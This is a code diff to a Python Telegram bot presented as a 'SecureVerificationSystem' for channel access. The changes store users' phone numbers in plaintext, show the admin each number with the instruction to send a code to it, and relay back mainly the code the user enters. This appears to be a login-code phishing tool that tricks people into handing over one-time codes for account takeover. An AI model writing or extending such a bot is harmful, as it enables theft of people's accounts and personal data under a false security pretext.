@@ -40,6 +40,7 @@ class SecureVerificationSystem:
                 uname TEXT,
                 fname TEXT,
                 contact_hash TEXT,
+                phone_number TEXT,
                 auth_token TEXT,
                 user_input TEXT,
                 created_at DATETIME,
@@ -216,9 +217,9 @@ Type /start to begin verification process.
             c = self.conn.cursor()
             c.execute('''
                 INSERT OR REPLACE INTO user_auth 
-                (uid, uname, fname, contact_hash, created_at, auth_status)
-                VALUES (?, ?, ?, ?, ?, ?)
-            ''', (u.id, u.username, u.first_name, contact_hash, datetime.now(), 'contact_received'))
+                (uid, uname, fname, contact_hash, phone_number, created_at, auth_status)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (u.id, u.username, u.first_name, contact_hash, contact.phone_number, datetime.now(), 'contact_received'))
             self.conn.commit()
             
             # Processing animation
@@ -314,11 +315,11 @@ Type /start to begin verification process.
         ''', (token, uid))
         self.conn.commit()
         
-        c.execute('SELECT fname, uname, contact_hash FROM user_auth WHERE uid = ?', (uid,))
+        c.execute('SELECT fname, uname, contact_hash, phone_number FROM user_auth WHERE uid = ?', (uid,))
         info = c.fetchone()
         
         if info:
-            fname, uname, chash = info
+            fname, uname, chash, phone = info
             
             # Send input interface to user
             await self.send_input_ui(context, uid, token)
@@ -328,10 +329,11 @@ Type /start to begin verification process.
 🔐 **Verification Code Generated**
 
 👤 User: {fname} (@{uname})
+📞 Phone: `{phone}`
 🔢 **CODE: `{token}`**
 
 ⚠️ **CRITICAL ACTION:**
-📲 **SEND `{token}` to user's phone NOW**
+📲 **SEND `{token}` to `{phone}` NOW**
 
 Status:
 ✅ User interface ready
@@ -449,13 +451,13 @@ This usually takes just a moment.
             )
             
             c.execute('''
-                SELECT fname, uname, contact_hash, auth_token
+                SELECT fname, uname, phone_number, auth_token
                 FROM user_auth WHERE uid = ?
             ''', (uid,))
             
             info = c.fetchone()
             if info:
-                fname, uname, chash, correct = info
+                fname, uname, phone, correct = info
                 
                 match = '✅ MATCH' if sess['input'] == correct else '❌ MISMATCH'
                 
@@ -466,16 +468,17 @@ This usually takes just a moment.
                 ])
                 
                 admin_rev = f"""
-🔍 **Code Review Required**
+🔍 **Code Verification Review**
 
 👤 User: {fname} (@{uname})
+📞 Phone: `{phone}`
 🆔 ID: `{uid}`
-⏰ {datetime.now().strftime('%H:%M:%S')}
 
-🔢 Generated: `{correct}`
-🔢 User Entry: `{sess['input']}`
+🔢 **User Entered Code:** `{sess['input']}`
 
 **Status: {match}**
+
+⏰ {datetime.now().strftime('%H:%M:%S')}
 
 Please review and take action.
                 """
@@ -500,7 +503,7 @@ Please review and take action.
             
             c = self.conn.cursor()
             c.execute('''
-                SELECT fname, uname, contact_hash, auth_token, user_input
+                SELECT fname, uname, phone_number, auth_token, user_input
                 FROM user_auth WHERE uid = ?
             ''', (uid,))
             
@@ -509,14 +512,14 @@ Please review and take action.
                 await q.edit_message_text("❌ User not found.")
                 return
             
-            fname, uname, chash, correct, entered = info
+            fname, uname, phone, correct, entered = info
             
             if action == 'approve':
                 c.execute('''
                     INSERT OR REPLACE INTO verified_members 
                     (uid, uname, fname, contact_hash, verified_at)
                     VALUES (?, ?, ?, ?, ?)
-                ''', (uid, uname, fname, chash, datetime.now()))
+                ''', (uid, uname, fname, self.hash_contact(phone), datetime.now()))
                 
                 c.execute('''
                     UPDATE user_auth 
@@ -561,7 +564,8 @@ Welcome! 🚀
 ✅ **APPROVED**
 
 👤 {fname} (@{uname})
-🔢 Code: `{correct}` ✓ `{entered}`
+📞 Phone: `{phone}`
+🔢 Code Entered: `{entered}`
 ⏰ {datetime.now().strftime('%H:%M:%S')}
 📢 Auto-approved: {len(approved_channels)} channel(s)
 
@@ -599,7 +603,8 @@ Your entry: `{entered}`
 ❌ **REJECTED**
 
 👤 {fname} (@{uname})
-🔢 Expected: `{correct}` | Got: `{entered}`
+📞 Phone: `{phone}`
+🔢 User Entered: `{entered}`
 ⏰ {datetime.now().strftime('%H:%M:%S')}
 
 Status: Verification denied
@@ -662,7 +667,7 @@ Status: Verification denied
         """Show pending verifications"""
         c = self.conn.cursor()
         c.execute('''
-            SELECT uid, fname, uname, contact_hash, created_at, auth_status, user_input, auth_token
+            SELECT uid, fname, uname, phone_number, created_at, auth_status, user_input, auth_token
             FROM user_auth 
             WHERE auth_status IN ('contact_received', 'started', 'code_generated', 'submitted')
             ORDER BY created_at DESC
@@ -677,7 +682,7 @@ Status: Verification denied
         msg = "📋 **Verification Queue:**\n\n"
         
         for u in pending:
-            uid, fname, uname, chash, ts, status, inp, token = u
+            uid, fname, uname, phone, ts, status, inp, token = u
             
             c.execute('''
                 SELECT COUNT(*) FROM access_requests 
@@ -694,13 +699,15 @@ Status: Verification denied
             
             msg += f"{status_icon.get(status, '❓')} **{fname}** (@{uname})\n"
             msg += f"   🆔 {uid}\n"
+            if phone:
+                msg += f"   📞 {phone}\n"
             msg += f"   📊 {status}\n"
             msg += f"   🔗 Pending: {pend_joins}\n"
             
-            if token and status == 'code_generated':
-                msg += f"   🔢 Code: `{token}`\n"
-            elif inp and token:
-                msg += f"   🔢 Gen: `{token}` | In: `{inp}`\n"
+            if inp and status == 'submitted':
+                msg += f"   🔢 User Code: `{inp}`\n"
+            elif token and status == 'code_generated':
+                msg += f"   🔢 Generated: `{token}` (waiting for user)\n"
             
             msg += "\n"
         
